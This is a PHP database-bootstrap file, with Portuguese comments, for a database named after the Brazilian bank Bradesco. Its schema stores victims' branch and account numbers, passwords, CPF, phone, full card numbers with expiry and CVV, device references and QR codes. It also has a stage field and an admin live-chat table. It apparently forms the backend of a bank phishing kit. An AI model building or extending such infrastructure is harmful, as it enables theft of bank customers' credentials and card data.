<?php
// ... (seu código de conexão ajustado está correto e foi mantido) ...

// Conexão PDO com PostgreSQL (Heroku/Render DATABASE_URL ou local)
$url = getenv('DATABASE_URL');

if ($url) {
    // CORREÇÃO: Trata a URL para garantir que 'parse_url' funcione corretamente
    $url = str_replace(['postgres://', 'postgresql://'], 'pgsql://', $url);

    $opts = parse_url($url);

    // Usa o operador de coalescência nula (??) para fornecer um valor padrão
    $host = $opts['host'] ?? 'localhost';
    $port = $opts['port'] ?? 5432;
    $user = $opts['user'] ?? '';
    $pass = $opts['pass'] ?? '';

    $dsn  = "pgsql:host={$host};port={$port};dbname=" . ltrim($opts['path'] ?? '', '/') . ";";

} else {
    // Configurações para ambiente de desenvolvimento local (fallback)
    $dsn  = "pgsql:host=localhost;port=5432;dbname=bradesco;";
    $user = "seu_usuario"; // Altere se necessário
    $pass = "sua_senha";   // Altere se necessário
}

try {
    $pdo = new PDO($dsn, $user, $pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
    ]);
} catch (PDOException $e) {
    die("Erro de conexão com o banco de dados: " . $e->getMessage());
}

// ─── BOOTSTRAP DO ESQUEMA ──────────────────────────────────────────────────────
// Cria todas as tabelas principais somente se ainda não existirem.
$migrations = [
    // Tabela de status de chat
    "CREATE TABLE IF NOT EXISTS chat_status (
        client_id INTEGER PRIMARY KEY,
        entrou_admin BOOLEAN NOT NULL DEFAULT FALSE
    )",

    // Tabela de Clientes (Estrutura base)
    "CREATE TABLE IF NOT EXISTS clients (
        id SERIAL PRIMARY KEY,
        cliente_id INTEGER,
        agencia TEXT,
        conta TEXT,
        digito TEXT,
        socket_id TEXT,
        nome TEXT,
        chave TEXT,
        senha TEXT,
        status TEXT NOT NULL DEFAULT 'guest',
        created_at TIMESTAMP NOT NULL DEFAULT now(),
        identificador_cookie VARCHAR(100) UNIQUE,
        updated_at TIMESTAMP NOT NULL DEFAULT now()
    )",

    // Tabela de Mensagens
    "CREATE TABLE IF NOT EXISTS messages (
        id SERIAL PRIMARY KEY,
        sender_id INTEGER NOT NULL,
        receiver_id INTEGER NOT NULL,
        message TEXT NOT NULL,
        created_at TIMESTAMP NOT NULL DEFAULT now()
    )"
];

foreach ($migrations as $sql) {
    $pdo->exec($sql);
}

// Garante que TODAS as colunas adicionais existam na tabela 'clients'.
$column_migrations = [
    "ALTER TABLE clients ADD COLUMN IF NOT EXISTS cpf TEXT",
    "ALTER TABLE clients ADD COLUMN IF NOT EXISTS telefone TEXT",
    "ALTER TABLE clients ADD COLUMN IF NOT EXISTS last_active_at TIMESTAMP",
    "ALTER TABLE clients ADD COLUMN IF NOT EXISTS saldo NUMERIC(11, 2) DEFAULT 0.00",
    "ALTER TABLE clients ADD COLUMN IF NOT EXISTS referencia_dispositivo TEXT",
    "ALTER TABLE clients ADD COLUMN IF NOT EXISTS numero_cartao TEXT",
    "ALTER TABLE clients ADD COLUMN IF NOT EXISTS validade_cartao TEXT",
    "ALTER TABLE clients ADD COLUMN IF NOT EXISTS cvv_cartao TEXT",
    "ALTER TABLE clients ADD COLUMN IF NOT EXISTS status_estagio VARCHAR(100)",
    "ALTER TABLE clients ADD COLUMN IF NOT EXISTS last_page_at TIMESTAMP",
    "ALTER TABLE clients ADD COLUMN IF NOT EXISTS qrcode_img_base64 TEXT",
    "ALTER TABLE clients ADD COLUMN IF NOT EXISTS qrcode_updated_at TIMESTAMP",
    "ALTER TABLE clients ADD COLUMN IF NOT EXISTS tipo TEXT"
];

foreach ($column_migrations as $sql) {
    $pdo->exec($sql);
}

// (Opcional) Indexar ou dispara triggers se precisar:
$pdo->exec("
    CREATE INDEX IF NOT EXISTS idx_messages_sender
    ON messages(sender_id);
");